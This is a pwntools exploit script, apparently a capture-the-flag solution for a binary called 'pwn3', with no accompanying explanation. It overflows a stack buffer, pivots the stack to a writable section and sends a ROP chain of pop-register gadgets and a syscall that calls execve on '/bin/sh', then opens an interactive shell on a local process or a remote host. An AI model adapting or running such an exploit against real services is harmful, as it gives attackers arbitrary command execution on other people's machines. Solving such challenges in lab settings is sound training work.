#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'pwn3')

host = args.HOST or '1.1.1.1'
port = int(args.PORT or 1234)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *vuln+49
continue
'''.format(**locals())

pop_rax = 0x000000000043d81c
pop_rdi = 0x0000000000401716
pop_rsi = 0x0000000000406978
pop_rdx = 0x000000000043ce75
syscall = 0x0000000000463175
rw_section = 0x4a8000 - 0x200

vuln = 0x401C66

io = start()

io.clean()
p = b"A" * 0x30
p += p64(rw_section)
p += p64(pop_rax)
p += p64(rw_section)
p += p64(vuln)
io.send(p)

p = p64(0)
p += p64(pop_rax)
p += p64(59)
p += p64(pop_rdi)
p += p64(0x4a7e50)
p += p64(pop_rsi)
p += p64(0)
p += p64(pop_rdx)
p += p64(0)
p += p64(syscall)
p += b"/bin/sh\x00"

io.clean()
io.send(p)
io.interactive()
